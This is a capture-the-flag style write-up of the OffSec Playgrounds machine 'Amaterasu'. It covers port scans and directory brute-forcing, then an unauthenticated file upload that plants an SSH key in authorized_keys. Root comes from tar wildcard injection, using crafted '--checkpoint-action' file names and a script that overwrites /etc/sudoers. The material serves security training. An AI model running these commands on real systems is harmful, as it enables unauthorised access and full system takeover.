---
title: "Amaterasu"
date: 2024-06-12
layout: "simple"
categories: [Offsec]
tags: [Privesc, Boot2root, Tar wildcard]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---

# Introduction

In this writeup we are going to check out a machine available on the [offsec playgrounds](https://portal.offsec.com/labs/play).

The idea here was to learn how to use curl and upload files that would ultimately help us into getting an initial foothold into the machine and then use the old tar wildcard to escalate our privileges.

Let's learn.


## Nmap
```shell
>amaterasu sudo nmap -T4 -sVC 192.168.241.249 -oN nmap.txt -vv
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 10:33 EAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:33
Completed NSE at 10:33, 0.00s elapsed
Initiating Ping Scan at 10:33
Scanning 192.168.241.249 [4 ports]
Completed Ping Scan at 10:33, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:33
Completed Parallel DNS resolution of 1 host. at 10:33, 0.01s elapsed
Initiating SYN Stealth Scan at 10:33
Scanning 192.168.241.249 [1000 ports]
Discovered open port 21/tcp on 192.168.241.249
Completed SYN Stealth Scan at 10:33, 7.33s elapsed (1000 total ports)
Initiating Service scan at 10:33
Scanning 1 service on 192.168.241.249
Completed Service scan at 10:33, 0.28s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.241.249.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:33
NSE: [ftp-bounce 192.168.241.249:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.32% done; ETC: 10:34 (0:00:00 remaining)
Completed NSE at 10:34, 30.79s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:34
Completed NSE at 10:34, 0.98s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:34
Completed NSE at 10:34, 0.00s elapsed
Nmap scan report for 192.168.241.249
Host is up, received echo-reply ttl 61 (0.14s latency).
Scanned at 2024-05-07 10:33:23 EAT for 39s
Not shown: 992 filtered tcp ports (no-response)
PORT      STATE  SERVICE          REASON         VERSION
21/tcp    open   ftp              syn-ack ttl 61 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    closed ssh              reset ttl 61
111/tcp   closed rpcbind          reset ttl 61
139/tcp   closed netbios-ssn      reset ttl 61
443/tcp   closed https            reset ttl 61
445/tcp   closed microsoft-ds     reset ttl 61
2049/tcp  closed nfs              reset ttl 61
10000/tcp closed snet-sensor-mgmt reset ttl 61
Service Info: OS: Unix

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:34
Completed NSE at 10:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:34
Completed NSE at 10:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:34
Completed NSE at 10:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.16 seconds
           Raw packets sent: 2000 (87.976KB) | Rcvd: 13 (512B)
```
Open port is 21 which has anonymous login, interesting. But then nothing really was happening in here and so I had to opt for another nmap scan, scanning for all open ports just to see if we can find some interesting things. 
```shell
->amaterasu sudo nmap -p- 192.168.241.249 -vv
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 10:58 EAT
Initiating Ping Scan at 10:58
Scanning 192.168.241.249 [4 ports]
Completed Ping Scan at 10:58, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:58
Completed Parallel DNS resolution of 1 host. at 10:58, 0.01s elapsed
Initiating SYN Stealth Scan at 10:58
Scanning 192.168.241.249 [65535 ports]
Discovered open port 21/tcp on 192.168.241.249
SYN Stealth Scan Timing: About 5.58% done; ETC: 11:07 (0:08:44 remaining)
Discovered open port 33414/tcp on 192.168.241.249
SYN Stealth Scan Timing: About 11.15% done; ETC: 11:07 (0:08:06 remaining)
Discovered open port 40080/tcp on 192.168.241.249
SYN Stealth Scan Timing: About 8.69% done; ETC: 11:15 (0:16:07 remaining)
SYN Stealth Scan Timing: About 16.02% done; ETC: 11:16 (0:15:07 remaining)
SYN Stealth Scan Timing: About 21.14% done; ETC: 11:14 (0:12:37 remaining)
SYN Stealth Scan Timing: About 26.42% done; ETC: 11:14 (0:11:48 remaining)
SYN Stealth Scan Timing: About 33.01% done; ETC: 11:14 (0:10:55 remaining)
SYN Stealth Scan Timing: About 42.10% done; ETC: 11:12 (0:08:06 remaining)
SYN Stealth Scan Timing: About 48.79% done; ETC: 11:11 (0:06:42 remaining)
SYN Stealth Scan Timing: About 54.15% done; ETC: 11:11 (0:05:50 remaining)
SYN Stealth Scan Timing: About 59.21% done; ETC: 11:10 (0:05:07 remaining)
Discovered open port 25022/tcp on 192.168.241.249
SYN Stealth Scan Timing: About 68.35% done; ETC: 11:09 (0:03:40 remaining)
SYN Stealth Scan Timing: About 79.37% done; ETC: 11:08 (0:02:12 remaining)
SYN Stealth Scan Timing: About 88.44% done; ETC: 11:08 (0:01:10 remaining)
SYN Stealth Scan Timing: About 93.58% done; ETC: 11:08 (0:00:39 remaining)
SYN Stealth Scan Timing: About 95.33% done; ETC: 11:09 (0:00:30 remaining)
Completed SYN Stealth Scan at 11:09, 648.94s elapsed (65535 total ports)
Nmap scan report for 192.168.241.249
Host is up, received echo-reply ttl 61 (0.15s latency).
Scanned at 2024-05-07 10:58:19 EAT for 649s
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE  SERVICE          REASON
21/tcp    open   ftp              syn-ack ttl 61
22/tcp    closed ssh              reset ttl 61
111/tcp   closed rpcbind          reset ttl 61
139/tcp   closed netbios-ssn      reset ttl 61
443/tcp   closed https            reset ttl 61
445/tcp   closed microsoft-ds     reset ttl 61
2049/tcp  closed nfs              reset ttl 61
10000/tcp closed snet-sensor-mgmt reset ttl 61
25022/tcp open   unknown          syn-ack ttl 61
33414/tcp open   unknown          syn-ack ttl 61
40080/tcp open   unknown          syn-ack ttl 61

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 649.31 seconds
           Raw packets sent: 197008 (8.668MB) | Rcvd: 57238 (7.396MB)=
```
And we see that there were other open ports in here, but are unknown. So we can check for their banners and see what they have using `nc -v {ip} {port}`. 
Ideally we can also use whatweb to confirm others as well.
```shell-session
->amaterasu whatweb http://192.168.241.249:33414/
http://192.168.241.249:33414/ [404 Not Found] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.3 Python/3.9.13], IP[192.168.241.249], Python[3.9.13], Title[404 Not Found], Werkzeug[2.2.3]
```
Interesting we find that there is a HTTP server running werkzeug on this port though it returns an error 404 we can do some directory brute forcing. 
```shell
->amaterasu gobuster dir -u http://192.168.241.249:33414/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.241.249:33414/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/help                 (Status: 200) [Size: 137]
/info                 (Status: 200) [Size: 98]
```

We then come across two directories that we can look at.
<img width="600" alt="info" src="https://gist.github.com/assets/116626767/db8ba43c-a637-4446-9ed9-d9fdf5801323">


<img width="600" alt="help" src="https://gist.github.com/assets/116626767/7cda9a07-7be4-4929-bbd0-f2f5d662a6ad">


We can see more commands in here maybe see what else we can do with the server.

<img width="600" alt="file_ls" src="https://gist.github.com/assets/116626767/39503fe5-38e7-4a15-8cc2-c61966f80be5">


We can see that we can list things in the system. There is also a file-upload which could mean that we can upload a file, file like a id_rsa in there that allows us to ssh into the machine, we can create our own ssh and upload it. We can use this to learn how to upload files on the system, [curl_file_name](https://www.warp.dev/terminus/curl-file-upload)

`curl -F "file=@id_rsa.txt" -F "filename=/home/alfredo/.ssh/authorized_keys" -X POST http://192.168.241.249:33414/file-upload
`
We get a upload successful message, and then we can use ssh using id rsa to get into the machine with the ssh keys that we generated.
Now since port 22 was closed we can check what our other unknown ports had. Maybe we can get another thing on it. 
```shell
->amaterasu nc -v 192.168.241.249 25022           
192.168.241.249: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.241.249] 25022 (?) open
SSH-2.0-OpenSSH_8.6
```

Awesome we get one port that has a SSH connection, we can specify this port using -p 
```shell
->amaterasu ssh -i id_rsa alfredo@192.168.241.249 -p 25022
Last login: Tue May  7 06:37:25 2024 from 192.168.45.214
-bash-5.1$ 
```
## Privilege escalation
We can then try and escalate our privileges, by first checking if there are any cronjobs running in the system. Lucky enough we find one.

<img width="500" alt="crontab" src="https://gist.github.com/assets/116626767/780abb4e-3b0f-4f1a-a87a-6bfb4bbc1280">

<img width="600" alt="flask" src="https://gist.github.com/assets/116626767/9b18c094-e3a5-4b0d-93e1-ac20401ada30">

We can then check it out and we see that it may seem like a totally safe script but in truth the `*` command at the end makes it possible to leverage and create crafted filenames interprated as flags for tar.

Then under the tar man page we learn that we could execute commands via the '--checkpoint-action' flag

```shell
 --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

Next:
Create this files in the current directory
`echo "echo 'alfredo ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > exploit.sh`

`echo "" > "--checkpoint-action=exec=sh exploit.sh"`

`echo "" > '--checkpoint=1'`


<img width="600" alt="exploits" src="https://gist.github.com/assets/116626767/6e953048-0c45-4ce5-b96b-0070b4fd2bb7">

This injects an entry into the `sudoers` file that allows the user `alfredo` use sudo without a password.

Now running `sudo su` works like a charm and we are root.

<img width="600" alt="root" src="https://gist.github.com/assets/116626767/1d5043d7-16c0-4b1a-ae93-183dd7673ac5">

## Resources


- [tar wildcard](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
